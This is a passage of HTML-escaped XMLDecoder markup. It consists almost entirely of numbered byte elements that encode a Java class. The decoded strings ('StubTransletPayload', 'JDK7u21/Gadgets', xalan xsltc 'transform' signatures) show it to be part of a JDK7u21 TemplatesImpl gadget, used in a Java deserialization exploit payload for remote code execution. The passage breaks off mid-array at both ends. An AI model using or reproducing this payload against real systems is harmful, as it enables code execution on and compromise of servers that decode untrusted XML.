&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="488"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="489"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="490"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="491"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="492"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="493"&gt; &lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="494"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="495"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="496"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="498"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="499"&gt; &lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="500"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="502"&gt; &lt;byte&gt;13&lt;/byte&gt;&lt;/void&gt;&lt;void index="503"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="504"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="505"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="506"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="507"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="508"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="509"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="510"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="511"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="512"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="513"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="514"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="515"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="516"&gt; &lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="517"&gt; &lt;byte&gt;-83&lt;/byte&gt;&lt;/void&gt;&lt;void index="518"&gt; &lt;byte&gt;32&lt;/byte&gt;&lt;/void&gt;&lt;void index="519"&gt; &lt;byte&gt;-109&lt;/byte&gt;&lt;/void&gt;&lt;void index="520"&gt; &lt;byte&gt;-13&lt;/byte&gt;&lt;/void&gt;&lt;void index="521"&gt; &lt;byte&gt;-111&lt;/byte&gt;&lt;/void&gt;&lt;void index="522"&gt; &lt;byte&gt;-35&lt;/byte&gt;&lt;/void&gt;&lt;void index="523"&gt; &lt;byte&gt;-17&lt;/byte&gt;&lt;/void&gt;&lt;void index="524"&gt; &lt;byte&gt;62&lt;/byte&gt;&lt;/void&gt;&lt;void index="525"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="527"&gt; &lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="528"&gt; &lt;byte&gt;60&lt;/byte&gt;&lt;/void&gt;&lt;void index="529"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="530"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="531"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="532"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="533"&gt; &lt;byte&gt;62&lt;/byte&gt;&lt;/void&gt;&lt;void index="534"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="536"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="537"&gt; &lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="538"&gt; &lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="539"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="540"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="542"&gt; &lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="543"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="544"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="545"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="546"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="547"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="549"&gt; &lt;byte&gt;15&lt;/byte&gt;&lt;/void&gt;&lt;void index="550"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="551"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="552"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="553"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="554"&gt; &lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="555"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="556"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="557"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="558"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="559"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="560"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="561"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="562"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="563"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="564"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="565"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="567"&gt; &lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="568"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="569"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="570"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="571"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="572"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="573"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="574"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="575"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="576"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="577"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="578"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="579"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="580"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="581"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="582"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="583"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="584"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="585"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="586"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="588"&gt; &lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="589"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="590"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="591"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="592"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="593"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="595"&gt; &lt;byte&gt;19&lt;/byte&gt;&lt;/void&gt;&lt;void index="596"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="597"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="598"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="599"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="600"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="601"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="602"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="603"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="604"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="605"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="606"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="607"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="608"&gt; &lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="609"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="610"&gt; &lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="611"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="612"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="613"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="614"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="615"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="617"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="618"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="619"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="620"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="621"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="622"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="623"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="624"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="625"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="626"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="627"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="628"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="629"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="630"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="632"&gt; &lt;byte&gt;37&lt;/byte&gt;&lt;/void&gt;&lt;void index="633"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="634"&gt; &lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="635"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="636"&gt; &lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="637"&gt; &lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="638"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="639"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="640"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="641"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="642"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="643"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="644"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="645"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="646"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="647"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="648"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="649"&gt; &lt;byte&gt;36&lt;/byte&gt;&lt;/void&gt;&lt;void index="650"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="651"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="652"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="653"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="654"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="655"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="656"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="657"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="658"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="659"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="660"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="661"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="662"&gt; &lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="663"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="664"&gt; &lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="665"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="666"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="667"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="668"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="669"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="670"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="672"&gt; &lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="673"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="674"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="675"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="676"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="677"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="678"&gt; &lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="679"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="680"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="681"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="682"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="684"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="685"&gt; &lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="686"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="687"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="688"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="689"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="690"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="691"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="692"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="693"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="694"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="695"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="696"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="697"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="698"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="699"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="700"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="701"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="702"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="703"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="704"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="705"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="706"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="707"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="708"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="709"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="710"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="711"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="712"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="713"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="714"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="715"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="716"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="717"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="718"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="719"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="720"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="721"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="722"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="723"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="724"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="725"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="726"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="727"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="728"&gt; &lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="729"&gt; &lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="730"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="731"&gt; &lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="732"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="733"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="734"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="735"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="736"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="737"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="738"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="739"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="740"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="741"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="742"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="743"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="744"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="745"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="746"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="747"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="748"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="749"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="750"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="751"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="752"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="753"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="754"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="755"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="756"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="757"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="758"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="759"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="760"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="761"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="762"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="763"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="764"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="765"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="766"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="767"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="768"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="769"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="770"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="771"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="772"&gt; &lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="773"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="774"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="775"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="776"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="777"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="778"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="779"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="780"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="781"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="782"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="783"&gt; &lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="784"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="785"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="786"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="787"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="788"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="789"&gt; &lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="790"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="791"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="792"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="793"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="794"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="795"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="796"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="797"&gt; &lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="798"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="799"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="801"&gt; &lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="802"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="803"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="804"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="805"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="806"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="807"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="808"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="809"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="810"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="812"&gt; &lt;byte&gt;45&lt;/byte&gt;&lt;/void&gt;&lt;void index="813"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="814"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="815"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="816"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="817"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="818"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="819"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="820"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="821"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="822"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="823"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="824"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="825"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="826"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="827"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="828"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="829"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="830"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="831"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="832"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="833"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="834"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="835"&gt; 